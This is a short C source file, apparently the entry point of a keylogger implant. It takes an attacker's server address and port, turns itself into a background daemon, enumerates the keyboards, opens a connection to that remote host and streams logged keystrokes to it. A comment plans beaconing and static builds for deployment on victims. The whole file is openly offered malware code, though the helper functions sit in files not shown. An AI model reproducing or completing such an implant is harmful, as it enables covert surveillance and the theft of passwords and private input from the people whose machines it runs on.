

#include <unistd.h>
#include "implant.h"

int main(int ac, char **av, char **envp) {

    /*
        TODO:

        get current layout & send beacon packets to the server.
        https://superuser.com/a/1300093

        then, drop the lib dependancy and compile statically on client-side
    */

    implant_t instance = {
        .ip = {0}, .port = 80, /* ip can be a domain name */
    };

    if (ERROR == parse_user_input(ac, av, &instance))
        return 1;

    daemon_setup();

#ifdef DEBUG
    DEBUG_LOG("[*] Implant settings:\n\tIP:%s\n\tPort:%d", instance.ip, instance.port);
#endif

    fetch_available_keyboards(&instance);

    int sockfd = init_remote_connection(&instance);
    if (sockfd < 0)
        return 1;

    keylog(&instance, sockfd);
    return 0;
}
